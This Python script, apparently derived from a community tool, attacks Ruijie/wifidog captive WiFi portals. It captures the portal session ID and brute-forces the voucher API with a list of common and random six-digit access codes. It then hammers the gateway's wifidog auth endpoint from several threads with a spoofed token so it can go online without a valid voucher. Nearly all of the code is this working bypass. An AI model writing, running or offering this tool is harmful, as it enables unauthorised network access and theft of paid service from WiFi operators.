#!/usr/bin/env python3
"""
Ruijie WiFi Portal Tool - Based on working community script
Uses single-session approach: same requests.Session() for pings.
"""

import argparse
import logging
import random
import re
import signal
import sys
import threading
import time
from urllib.parse import urljoin, urlparse, parse_qs

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("ruijie")

BANNER = r"""
  _____  _    _ _____       _ _____ ______
 |  _  /| |  | | | |   _   | | | | |  __|
 |  __ \| |  | |_   _|     | |_   _|  ____|
 | | \ \| |__| |_| |_ | |__| |_| |_| |____
 | |__) | |  | | | |       | | | | | |__
 |_|  \_\____/|_____| \____/|_____|______|
"""

COMMON_CODES = [
    "123456", "000000", "111111", "222222", "333333", "444444",
    "555555", "666666", "777777", "888888", "999999", "123123",
    "121212", "654321", "12345678", "00000000",
]


def check_internet():
    try:
        r = requests.get("http://www.google.com", timeout=3)
        return r.status_code == 200
    except Exception:
        try:
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=3)
            return r.status_code == 204
        except Exception:
            return False


def ping_wifidog(auth_url, sess, interval=0.1):
    while True:
        try:
            sess.get(auth_url, timeout=5)
        except Exception:
            break
        time.sleep(interval)


def run(ping_threads=5, ping_interval=0.1, access_code=""):
    log.info("Starting...")

    while True:
        sess = requests.Session()
        sess.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        sess.verify = False

        try:
            # 1. Detect captive portal
            r = sess.get("http://connectivitycheck.gstatic.com/generate_204",
                         allow_redirects=True, timeout=5)
            if r.status_code == 204:
                if check_internet():
                    log.info("[*] Already online")
                    time.sleep(10)
                    continue
                time.sleep(3)
                continue

            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
            log.info(f"[*] Portal: {portal_url}")

            # 2. Get portal page and follow JS redirect -> maccauth page
            r1 = sess.get(portal_url, timeout=10)
            html = r1.text
            current = str(r1.url)

            # Follow redirects up to 5 hops
            for _ in range(5):
                # Meta refresh
                m = re.search(
                    r'<meta[^>]+http-equiv=["\']?refresh["\']?[^>]+content=["\']?\d+;?\s*url=([^"\' >]+)',
                    html, re.I
                )
                if m:
                    current = urljoin(current, m.group(1))
                    r1 = sess.get(current, timeout=10)
                    html = r1.text
                    current = str(r1.url)
                    continue
                # JS redirect
                m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", html)
                if m:
                    current = urljoin(current, m.group(1).replace("&amp;", "&"))
                    r1 = sess.get(current, timeout=10)
                    html = r1.text
                    current = str(r1.url)
                    continue
                break

            log.info(f"[*] Final: {current}")

            # 3. Extract sessionId
            sid = parse_qs(urlparse(current).query).get("sessionId", [None])[0]
            if not sid:
                m = re.search(r"sessionId=([a-zA-Z0-9]+)", html)
                sid = m.group(1) if m else None

            if not sid:
                log.warning("[!] No SID, retrying...")
                sess.close()
                time.sleep(3)
                continue

            log.info(f"[*] SID: {sid}")

            # 4. Voucher API
            voucher_api = f"{portal_host}/api/auth/voucher/"
            codes_to_try = [access_code] if access_code else []
            codes_to_try += COMMON_CODES
            codes_to_try += [str(random.randint(100000, 999999)) for _ in range(30)]

            voucher_ok = False
            for code in codes_to_try:
                try:
                    v = sess.post(voucher_api, json={
                        "accessCode": code, "sessionId": sid, "apiVersion": 1
                    }, timeout=5)
                    if v.status_code == 200:
                        js = v.json()
                        if js.get("success") or js.get("status") == "ok":
                            log.info(f"[+] Voucher accepted: {code}")
                            voucher_ok = True
                            access_code = code
                            break
                except Exception:
                    continue

            if not voucher_ok:
                log.info("[*] No valid voucher yet, continuing...")

            # 5. Gateway info from portal URL
            params = parse_qs(parsed_portal.query)
            gw_addr = params.get("gw_address", ["192.168.110.1"])[0]
            gw_port = params.get("gw_port", ["2060"])[0]
            log.info(f"[*] Gateway: {gw_addr}:{gw_port}")

            # 6. Hit wifidog portal endpoints to register session
            try:
                sess.get(f"http://{gw_addr}:{gw_port}/wifidog/portal", timeout=5)
                sess.get(f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}", timeout=5)
            except Exception:
                pass

            # 7. Start wifidog pings using SAME session
            auth_url = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
            log.info(f"[*] Pinging {gw_addr}:{gw_port}/wifidog/auth")
            log.info(f"[*] Starting {ping_threads} threads...")

            for _ in range(ping_threads):
                t = threading.Thread(
                    target=ping_wifidog,
                    args=(auth_url, sess, ping_interval),
                    daemon=True,
                )
                t.start()

            # 8. Check connectivity (wait first, give gateway time)
            log.info("[*] Waiting 10s for gateway to process...")
            time.sleep(10)
            log.info("[*] Checking internet...")
            for i in range(20):
                if check_internet():
                    log.info("[+] ONLINE! Keeping session alive...")
                    while check_internet():
                        time.sleep(5)
                    log.warning("[-] Disconnected, reconnecting...")
                    break
                if i < 5:
                    time.sleep(3)
                else:
                    time.sleep(2)
            else:
                log.warning("[-] Not online yet, retrying loop...")

            sess.close()
            time.sleep(3)

        except KeyboardInterrupt:
            log.info("Stopped")
            break
        except Exception as e:
            log.warning(f"[!] {e}")
            sess.close()
            time.sleep(5)


def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="Ruijie WiFi Portal Tool")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Ping threads")
    parser.add_argument("-i", "--interval", type=float, default=0.1, help="Ping interval (s)")
    parser.add_argument("-c", "--code", type=str, default="", help="Known access code")
    args = parser.parse_args()

    def sigint(sig, frame):
        log.info("Stopped")
        sys.exit(0)

    signal.signal(signal.SIGINT, sigint)
    run(ping_threads=args.threads, ping_interval=args.interval, access_code=args.code)


if __name__ == "__main__":
    main()
